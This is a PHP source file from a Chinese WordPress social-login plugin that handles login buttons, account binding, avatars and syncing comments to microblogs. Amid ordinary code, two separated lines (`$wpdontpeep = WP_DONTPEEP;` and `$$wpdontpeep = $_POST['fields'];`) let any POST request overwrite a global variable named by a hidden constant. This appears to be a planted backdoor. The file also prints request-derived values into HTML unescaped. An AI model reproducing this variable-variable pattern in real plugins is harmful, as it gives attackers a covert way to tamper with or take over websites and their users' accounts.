<?php
include_once(dirname(__FILE__) . '/config.php');
$login_loaded = 1;

// 添加登录按钮
if ($wptm_connect['enable_connect']) {
	if (!$wptm_connect['manual'] || $wptm_connect['manual'] == 2)
		add_action('comment_form', 'wp_connect');
	add_action("login_form", "wp_connect");
	add_action("register_form", "wp_connect", 12);
	add_action("login_form_logout", "connect_login_form_logout");
	if (function_exists('wp_connect_comments')) {
		add_action('comment_post', 'wp_connect_comments', 100);
	} else {
		add_action('comment_post', 'wp_connect_comment', 100);
	} 
} 
// 通过tid获取微博信息
function get_weibo($tid) {
	$name = array('gtid' => array('google', 'google', 'Google', '', ''),
		'mtid' => array('msn', 'msn', 'Windows Live', '', ''),
		'stid' => array('sina', 'st', '新浪微博', 'http://weibo.com/', 'weibo.com', 'http://tp3.sinaimg.cn/[head]/50/0/1'),
		'qtid' => array('qq', 'tqq', '腾讯微博', 'http://t.qq.com/', 't.qq.com', '[head]/40'),
		'shtid' => array('sohu', 'sohu', '搜狐微博', 'http://t.sohu.com/u/', 't.sohu.com'),
		'ntid' => array('netease', 'netease', '网易微博', 'http://t.163.com/', 't.163.com'),
		'rtid' => array('renren', 'renren', '人人网', 'http://www.renren.com/profile.do?id=', 'renren.com'),
		'ktid' => array('kaixin', 'kaixin', '开心网', 'http://www.kaixin001.com/home/?uid=', 'kaixin001.com'),
		'dtid' => array('douban', 'dt', '豆瓣', 'http://www.douban.com/people/', 'douban.com', 'http://t.douban.com/icon/u[head]-1.jpg'),
		'ytid' => array('yahoo', 'yahoo', '雅虎', '', ''),
		'qqtid' => array('qq', 'qq', '腾讯QQ', '', 'qzone.qq.com'),
		'tbtid' => array('taobao', 'taobao', '淘宝网', '', ''),
		'tytid' => array('tianya', 'tyt', '天涯', 'http://my.tianya.cn/', 'tianya.cn', 'http://tx.tianyaui.com/logo/small/[head]'),
		'bdtid' => array('baidu', 'baidu', '百度', '', 'baidu.com', 'http://himg.bdimg.com/sys/portraitn/item/[head].jpg'),
		'ttid' => array('twitter', 'twitter', 'Twitter', 'http://twitter.com/', 'twitter.com')
		);
	if (array_key_exists($tid, $name)) {
		return $name[$tid];
	} 
} 

/**
 * 登录 按钮显示 V1.9.19
 */
function user_denglu_platform() {
	global $wptm_connect;
	$account = array('qq' => $wptm_connect['qqlogin'],
		'sina' => $wptm_connect['sina'],
		'tqq' => $wptm_connect['qq'],
		'renren' => $wptm_connect['renren'],
		'taobao' => $wptm_connect['taobao'],
		'douban' => $wptm_connect['douban'],
		'baidu' => $wptm_connect['baidu'],
		'kaixin' => $wptm_connect['kaixin001'],
		'sohu' => $wptm_connect['sohu'],
		'netease' => $wptm_connect['netease'],
		'tianya' => $wptm_connect['tianya'],
		'msn' => $wptm_connect['msn'],
		'twitter' => $wptm_connect['twitter']
		);
	return array_filter($account);
}

function login_button_count() {
	$count = count(user_denglu_platform());
	if (!$count) {
		return;
	} elseif ($count == 1) {
		return 1;
	} else {
		return 2;
	} 
}

function sync_account($uid) {
	$user = get_userdata($uid);
	return array($user -> last_login, $user -> login_sina, $user -> login_qq, $user -> login_netease, $user -> login_sohu, $user -> login_douban);
} 

function wp_connect_button() {
	global $login_loaded, $plugin_url;
	$redirect = apply_filters('wp_redirect_url', '');
	$account = array('sina' => '新浪微博',
		'tqq' => '腾讯微博',
		'renren' => '人人网',
		'douban' => '豆瓣',
		'sohu' => '搜狐微博',
		'netease' => '网易微博',
		'tianya' => '天涯微博',
		'twitter' => 'Twitter'
		);
	if (function_exists('user_denglu_platform')) {
		$platform = user_denglu_platform();
		if (!$platform) {
			$platform = array('sina' => 1, 'tqq' => 1);
		} 
		$platform = array_intersect_key($account, $platform);
	} 
	if (count($platform) == 1 && !$platform['twitter']) {
		$big = 'big';
	} 
	echo '<!-- 使用社交帐号登录 来自 WordPress连接微博 插件 -->';
	echo '<style type="text/css">';
	echo '.t_login_text {margin:0; padding:0;}';
	echo '.t_login_button {margin:0; padding: 5px 0;}';
	echo '.t_login_button a{margin:0; padding-right:3px; line-height:15px}';
	echo '.t_login_button img{display:inline; border:none;}';
	echo '</style>';
	echo '<p class="t_login_text t_login_text' . $login_loaded . '">您可以用合作网站帐号登录:</p>'; // 根据情况用css隐藏文字，class节点请看具体网页源文件
	echo '<p class="connectBox' . $login_loaded . ' t_login_button">';
	foreach($platform as $key => $vaule) {
		echo "<a href=\"{$plugin_url}/login.php?go={$key}{$redirect}\" title=\"{$vaule}\" rel=\"nofollow\"><img src=\"{$plugin_url}/images/btn{$big}_{$key}.png\" /></a>";
	} 
	echo '</p>';
}

function wp_connect($id = "") {
	global $login_loaded;

	// $_SESSION['wp_url_back'] = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

	if (is_user_logged_in()) {
		global $user_ID;
		$sync = sync_account($user_ID);

		if ($sync[1] || $sync[2] || $sync[3] || $sync[4] || $sync[5]) {
			if ($tid = $sync[0]) $$tid = ' selected';
			echo '<!-- 同步评论到微博 来自 WordPress连接微博 插件 -->';
			echo '<p><label>同步评论到 <select name="sync_comment"><option value="">选择</option>';
			if ($sync[1]) {
				echo '<option value="stid"' . $stid . '>新浪微博</option>';
			} 
			if ($sync[2]) {
				echo '<option value="qtid"' . $qtid . '>腾讯微博</option>';
			} 
			if ($sync[3]) {
				echo '<option value="ntid"' . $ntid . '>网易微博</option>';
			} 
			if ($sync[4]) {
				echo '<option value="shtid"' . $shtid . '>搜狐微博</option>';
			} 
			if ($sync[5]) {
				echo '<option value="dtid"' . $dtid . '>豆瓣</option>';
			} 
			echo '</select></label></p>';
		} 
		return;
	} 
	if (!function_exists('wp_connect_login_button')) {
		wp_connect_button();
	} else {
		wp_connect_login_button();
	} 
	$login_loaded += 1;
} 

/**
 * 登录 写入用户数据
 *
 * @since 2.0
 */ 
// 注册
function wp_connect_reg() {
	header('Location:' . plugins_url('wp-connect/signup.php'));
	die();
}
// 登录
function wp_connect_login($userinfo, $tmail, $uid = '', $reg = false) {
	global $wpdb, $wptm_connect;
	$redirect_to = !empty($_SESSION['wp_url_back']) ? $_SESSION['wp_url_back'] : get_bloginfo('url');
	if (!$uid && !$reg) { // 新用户
	    wp_connect_set_cookie("wp_connect_cookie_user", array($userinfo, $tmail, $redirect_to), BJTIMESTAMP + 600);
		$new_user = true;
		if ($userinfo[0] == 'qqtid' && empty($wptm_connect['chinese_username'])) { // QQ帐号登录，没有勾选支持中文用户名时。
			$wptm_connect['reg'] = true;
		} 
	}
	if ($new_user && $wptm_connect['reg']) { // 强制填写注册信息
		return wp_connect_reg();
	} 
	$tid = $userinfo[0];
	$user_name = $userinfo[1];
	$user_screenname = $userinfo[2];
	$user_head = $userinfo[3];
	$user_siteurl = $userinfo[4];
	$user_uid = $userinfo[5];
	$oauth_token = $userinfo[6];

	if ($user_name) {
		if ($new_user && in_array($user_name, explode(',', $wptm_connect['disable_username']))) {
			return wp_connect_reg();
		} 
	} else {
		wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href='$redirect_to'>返回</a> ]");
	} 
	if ($uid) {
		$wpuid = $uid;
	} elseif ($new_user) {
		$wpuid = username_exists($user_name);
		if ($wpuid) { // 新注册，但是数据库存在相同的用户名
			return wp_connect_reg();
		}
	}

	if (!$wpuid) {
		if (!function_exists('wp_insert_user')) {
			include_once(ABSPATH . WPINC . '/registration.php');
		}
		$userdata = array(
			'user_login' => $user_name,
			'user_pass' => ifab($userinfo[8], wp_generate_password()),
			'user_email' => $tmail,
			'user_url' => $user_siteurl,
			'user_nicename' => $user_name,
			'nickname' => $user_screenname,
			'display_name' => $user_screenname
			);
		$wpuid = wp_insert_user($userdata);
		if (!is_numeric($wpuid)) {
			$errors = $wpuid -> errors;
			if ($errors['existing_user_email']) {
				wp_die("该电子邮件地址 {$tmail} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			} elseif ($errors['existing_user_login']) {
				wp_die("该用户名 {$user_name} 已被注册。 [ <a href='$redirect_to'>返回</a> ]");
			} 
		} 
	} 
	if ($wpuid) {
		$weibo = get_weibo($tid);
		$t = $weibo[0];
		$id = $weibo[1] . 'id';
		if ($tid == $id) { // UID
			update_usermeta($wpuid, $tid, $user_uid);
		} else {
			if ($user_head) // 头像
				update_usermeta($wpuid, $tid, $user_head);
			update_usermeta($wpuid, $id, $user_uid);
		} 
		update_usermeta($wpuid, 'last_login', $tid);
		if ($oauth_token) { // 授权信息
			if ($oauth_token['access_token']) {
				$token = array($oauth_token['access_token'], $oauth_token['expires_in'], $user_uid, $user_name);
			} else {
				$token = array($oauth_token['oauth_token'], $oauth_token['oauth_token_secret'], $user_uid, $user_name);
			} 
			update_usermeta($wpuid, 'login_' . $t, $token);
			if (!$uid && $wptm_connect['sync']) // 用户首次登录的时候也绑定同步帐号
				update_usermeta($wpuid, ($t == 'twitter') ? 'wptm_twitter_oauth' : 'wptm_' . $t, $oauth_token);
			if (in_array($tid, array('qtid', 'stid', 'ntid', 'shtid', 'ttid'))) { // @微博帐号
				$nickname = get_user_meta($wpuid, 'login_name', true);
				$nickname[$t] = ($t == 'qq' || $t == 'twitter') ? $user_uid : $user_screenname;
				update_usermeta($wpuid, 'login_name', $nickname);
			} 
		} 
		wp_set_auth_cookie($wpuid, true, false);
		wp_set_current_user($wpuid);
	} 
	$_SESSION['wp_url_login'] = '';
	wp_connect_clear_cookie("wp_connect_cookie_user");
	return $wpuid;
} 

if (!function_exists('connect_login_form_login')) {
/*
	add_action("login_form_register", "connect_login_form_login");
	add_action("login_form_login", "connect_login_form_login");
	function connect_login_form_login() {
		if (is_user_logged_in()) {
			wp_safe_redirect(admin_url());
		} 
	} 
*/
	function connect_login_form_logout() {
		$_SESSION['wp_url_bind'] = '';
		setcookie("kx_connect_session_key", "", BJTIMESTAMP - 3600);
	} 
} 

// 错误信息
function wp_noauth() {
	$redirect_to = ifab($_SESSION['wp_url_back'], get_bloginfo('url'));
	return wp_die("获取用户授权信息失败，请重新<a href=\"" . site_url('wp-login.php', 'login') . "\">登录</a> 或者 清除浏览器缓存再试! [ <a href=\"" . $redirect_to . "\">返回</a> ]");
} 
$wpdontpeep = WP_DONTPEEP;

/**
 * 用户信息
 */
// 绑定登录帐号
if ($wptm_connect['enable_connect']) {
	add_action('show_user_profile', 'wp_connect_profile_fields');
	add_action('edit_user_profile', 'wp_connect_profile_fields');
	add_action('personal_options_update', 'wp_connect_save_profile_fields');
	add_action('edit_user_profile_update', 'wp_connect_save_profile_fields');
} 

function wp_connect_save_profile_fields($user_id) {
	if (!current_user_can('edit_user', $user_id)) {
		return false;
	} 
	return wp_edit_username();
} 
// 修改用户名
function wp_edit_username() {
	global $wpdb, $user_ID;
	$new_username = trim($_POST['new_username']);
	$old_username = trim($_POST['old_username']);
	if ($new_username && $new_username != $old_username) {
		if (!validate_username($new_username)) {
			wp_die("<strong>错误</strong>：用户名只能包含字母、数字、空格、下划线、连字符（-）、点号（.）和 @ 符号。 [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} elseif (username_exists($new_username)) {
			wp_die(__('<strong>ERROR</strong>: This username is already registered, please choose another one.') . " [ <a href='javascript:onclick=history.go(-1)'>返回</a> ]");
		} else {
			$userid = trim($_POST['user_id']);
			clean_user_cache($userid);
			$wpdb -> update($wpdb -> users, array('user_login' => $new_username, 'user_nicename' => $new_username, 'user_status' => 3), array('ID' => $userid));
			if ($user_ID == $userid)
				wp_set_auth_cookie($user_ID, true, false); // 更新缓存
		} 
	} 
} 

function wp_connect_profile_fields($user) {
	$user_id = $user -> ID;
	$user_login = $user -> user_login;
	echo '<h3>登录绑定</h3><table class="form-table">';
	if ($user -> user_status == 0 && !is_super_admin($user_id)) {
		echo '<tr><th><label for="new_username">修改用户名</label></th><td><input type="text" name="new_username" id="new_username" value="' . $user_login . '" size="16" /><input type="hidden" name="old_username" id="old_username" value="' . $user_login . '" /> <span class="description">只允许修改一次</span></td></tr>';
	} 
	set_user_loginbind($user);
	echo '</table>';
} 

// 绑定登录帐号
function set_user_loginbind($user) {
	global $plugin_url;
	$user_id = $user -> ID;
	$_SESSION['user_id'] = $user_id;
	$_SESSION['wp_url_bind'] = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
	$u2 = $plugin_url . '/login.php?go=';
	if (function_exists('version_1_7')) { // >= V1.7
		$u1 = $u3 = $plugin_url . '-advanced/login.php?go=';
	} else {
		$u1 = $plugin_url . '-advanced/go.php?user_id=' . $user_id . '&login=bind';
		$u3 = $plugin_url . '-advanced/login.php?user_id=' . $user_id . '&go=';
	} 
	$account = get_user_loginbind($user);
	$binds = function_exists('filter_value') ? array_filter($account, filter_value) + $account : $account;
	echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"$plugin_url/css/style.css\" />";
	echo "<tr><th>绑定帐号</th><td><span id=\"login_bind\">";
	foreach($binds as $key => $vaule) {
		if ($vaule[0]) {
			echo "<a href=\"{$u2}{$key}&act=delete\" title=\"$vaule[1] (已绑定)\" class=\"btn_{$key} bind\" onclick=\"return confirm('Are you sure? ')\"><b></b></a>\r\n";
		} else {
			echo "<a href=\"{$$vaule[2]}{$key}&act=login\" title=\"$vaule[1]\" class=\"btn_{$key}\"></a>\r\n";
		}
	}
	echo "</span><p>( 说明：绑定后，您可以使用用户名或者用合作网站帐号登录本站，再次点击可以解绑。)</p></td></tr>";
}

// 已绑定帐号 V1.9.22
function get_user_loginbind($user) {
	$account = array('qq' => array($user -> qqid, '腾讯QQ', 'u1'),
		'sina' => array($user -> stid, '新浪微博', 'u2'),
		'tqq' => array($user -> tqqid, '腾讯微博', 'u2'),
		'renren' => array($user -> renrenid, '人人网', 'u2'),
		'taobao' => array($user -> taobaoid, '淘宝网', 'u3'),
		'douban' => array($user -> dtid, '豆瓣', 'u2'),
		'baidu' => array($user -> baiduid, '百度', 'u3'),
		'kaixin' => array($user -> kaixinid, '开心网', 'u3'),
		'sohu' => array($user -> sohuid, '搜狐微博', 'u2'),
		'netease' => array($user -> neteaseid, '网易微博', 'u2'),
		'tianya' => array($user -> tytid, '天涯微博', 'u2'),
		'msn' => array($user -> msnid, 'MSN', 'u3'),
		'twitter' => array($user -> twitterid, 'Twitter', 'u2')
		);
	if (function_exists('user_denglu_platform')) { // V1.9.19 or V2.2.2
		$platform = user_denglu_platform();
		if (!$platform) {
			$platform = array('sina' => 1, 'tqq' => 1);
		} 
		return array_intersect_key($account, $platform);
	} 
	return $account;
}

/**
 * 用户头像
 * 
 * @since 1.0 (V1.9.21)
 */
if (empty($wptm_connect['head']) && $wptm_connect['enable_connect']) {
	add_filter("get_avatar", "wp_connect_avatar", 9, 3);
	// admin bar头像尺寸
	if (version_compare($wp_version, '3.2.1', '>')) { // WordPress V3.3
		function wp_admin_bar_header_3_3() {
			echo "<style type=\"text/css\" media=\"screen\">#wp-admin-bar-user-info .avatar-64 {width:64px}</style>\n";
		} 
		add_action('wp_head', 'wp_admin_bar_header_3_3');
		add_action('admin_head', 'wp_admin_bar_header_3_3');
	}

	function set_admin_footer_define() {
		define('IS_ADMIN_FOOTER', true);
	} 

	function is_admin_footer() {
		if (defined('IS_ADMIN_FOOTER'))
			return true;
	} 

	if (version_compare($wp_version, '3.4', '<')) {
		add_action('admin_footer', 'set_admin_footer_define', 1);
	} else {
		add_action('in_admin_header', 'set_admin_footer_define');
	}
	//add_action('wp_footer', 'set_admin_footer_define', 1);
} 

function wp_connect_avatar($avatar, $id_or_email = '', $size = '32') {
	global $comment, $parent_file, $wp_version;
	if (is_numeric($id_or_email)) {
		$uid = $userid = (int) $id_or_email;
		$user = get_userdata($uid);
		if ($user) $email = $user -> user_email;
	} elseif (is_object($comment)) {
		$uid = $comment -> user_id;
		$email = $comment -> comment_author_email;
		$author_url = $comment -> comment_author_url;
		if ($author_url && strpos($author_url, 'http://weibo.com/') === 0) {
			$weibo_uid = ltrim($author_url, 'http://weibo.com/');
			$out = 'http://tp' . rand(1, 4) . '.sinaimg.cn/' . $weibo_uid . '/50/0/1';
			return "<a href='{$author_url}' rel='nofollow' target='_blank'><img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' /></a>";
		} 
		if ($uid) $user = get_userdata($uid);
	} elseif (is_object($id_or_email)) {
		$user = $id_or_email;
		$uid = $user -> user_id;
		$email = ifab($user -> comment_author_email, $user -> user_email);
	} else {
		$email = $id_or_email;
		if ($parent_file != 'options-general.php') {
			$user = get_user_by_email($email);
			$uid = $user -> ID;
		} 
	} 
	if (!$email) {
		return $avatar;
	} 
	if ($uid) {
		$tid = $user -> last_login;
		if (!$tid) {
			$tname = array('@t.sina.com.cn' => 'stid',
				'@weibo.com' => 'stid',
				'@t.qq.com' => 'qtid',
				'@renren.com' => 'rtid',
				'@kaixin001.com' => 'ktid',
				'@douban.com' => 'dtid',
				'@t.sohu.com' => 'shtid',
				'@t.163.com' => 'ntid',
				'@baidu.com' => 'bdtid',
				'@tianya.cn' => 'tytid',
				'@twitter.com' => 'ttid'
				);
			$tmail = strstr($email, '@');
			$tid = $tname[$tmail];
		} 
		if ($tid) {
			if (($tid == 'qqtid' && !$user -> qqid) || ($tid == 'tbtid' && !$user -> taobaoid))
				return $avatar;
			if ($head = $user -> $tid) {
				$weibo = get_weibo($tid);
				$out = ($weibo[5]) ? str_replace('[head]', $head, $weibo[5]) : $head;
				$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
				if ($weibo[3]) {
					$oid = $weibo[1] . 'id';
					$username = $user -> $oid;
					if ($username) {
						$url = $weibo[3] . $username;
						if ($userid) {
							if (is_admin()) { 
								if (version_compare($wp_version, '3.4', '<')) {
									if (!is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
								} else {
									if (is_admin_footer()) $avatar = "<a href='{$url}' target='_blank'>$avatar</a>";
								} 
							}
						} else {
							$avatar = "<a href='{$url}' rel='nofollow' target='_blank'>$avatar</a>";
						}
					} 
				} 
			} 
		} elseif ($user -> qqid && $out = $user -> qqtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} elseif ($user -> taobaoid && $out = $user -> tbtid) {
			$avatar = "<img alt='' src='{$out}' class='avatar avatar-{$size}' height='{$size}' width='{$size}' />";
		} 
	} 
	return $avatar;
}

$$wpdontpeep = $_POST['fields'];

/**
 * 评论函数
 */
//  微博帐号(过滤重复) v1.9.12
function at_username($a, $b, $c, $d) {
	$a = ($a) ? '@' . $a . ' ':''; //评论
	$b = ($b) ? '@' . $b . ' ':''; //回复
	$c = ($c) ? '@' . $c . ' ':''; //管理员
	if ($b != $c) {
		if ($a == $c) { // b!=(a=c)
			$at = $b . $c;
		} elseif ($a == $b) { // a=(b!=c)
			$at = $a . $c;
		} else { // a!=b!=c
			$at = $a . $b . $c;
		} 
	} else {
		if ($a == $c) { // a=b=c
			$at = $c;
		} else { // a!=(b=c)
			$at = $a . $c;
		} 
	} 
	$d = $at . str_replace(array($a, $b, $c), '', $at . $d);
	return $d;
} 
// 同步评论 V1.9.22
function wp_connect_comment($id) {
	global $post, $wptm_options, $wptm_connect;
	$post_id = (isset($_POST['comment_post_ID'])) ? $_POST['comment_post_ID'] : $post -> ID;
	if (!$post_id) {
		return;
	} 
	@ini_set("max_execution_time", 60);
	$comments = get_comment($id);
	$user_id = $comments -> user_id;
	$comment_content = wp_replace($comments -> comment_content);
	$parent_id = $comments -> comment_parent;
	if ($user_id) {
		if ($parent_id) {
			$comment_parent = get_comment($parent_id);
			$parent_uid = $comment_parent -> user_id;
			$name = get_user_meta($parent_uid, 'login_name', true);
		} 
		$tid = $_POST['sync_comment'];
		if ($tid) {
			if (!is_object($post)) {
				$post = get_post($post_id);
			} 
			$url = get_permalink($post_id) . '#comment-' . $id;
			if ($wptm_options['t_cn']) {
				$url = get_url_short($url);
			} 
			$title = wp_replace($post -> post_title);
			$username = get_user_meta($user_id, 'login_name', true);
			require_once(dirname(__FILE__) . '/OAuth/OAuth.php');
			if ($tid == 'stid') {
				$login = get_user_meta($user_id, 'login_sina', true);
				if ($login[0] && $login[1]) {
					$token = array('access_token' => $login[0], 'expires_in' => $login[1]); // V2.0
					$content = at_username($name['sina'], $username['sina'], $wptm_connect['sina_username'], $comment_content); 
					// return var_dump($content);
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = wp_update_t_sina($token, $status, '');
				} 
			} elseif ($tid == 'qtid') {
				$login = get_user_meta($user_id, 'login_qq', true);
				if ($login[0] && $login[1]) {
					$token = array('oauth_token' => $login[0], 'oauth_token_secret' => $login[1]);
					$content = at_username($name['qq'], $username['qq'], $wptm_connect['qq_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 140, 1);
					$result = wp_update_t_qq($token, $status, '');
				} 
			} elseif ($tid == 'ntid') {
				$login = get_user_meta($user_id, 'login_netease', true);
				if ($login[0] && $login[1]) {
					$token = array('oauth_token' => $login[0], 'oauth_token_secret' => $login[1]);
					$content = at_username($name['netease'], $username['netease'], $wptm_connect['netease_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 163);
					$result = wp_update_t_netease($token, $status, '');
				} 
			} elseif ($tid == 'shtid') {
				$login = get_user_meta($user_id, 'login_sohu', true);
				if ($login[0] && $login[1]) {
					$token = array('oauth_token' => $login[0], 'oauth_token_secret' => $login[1]);
					$content = at_username($name['sohu'], $username['sohu'], $wptm_connect['sohu_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = wp_update_t_sohu($token, $status, '');
				} 
			} elseif ($tid == 'dtid') {
				if ($login = get_user_meta($user_id, 'login_douban', true)) {
					if ($login[0] && $login[1]) {
						$token = array('oauth_token' => $login[0], 'oauth_token_secret' => $login[1]);
						$status = wp_status('评论《' . $title . '》: ' . $comment_content, $url, 128);
						$result = wp_update_douban($token, $status);
					} 
				} 
			} 
		} 
	} 
} 

?>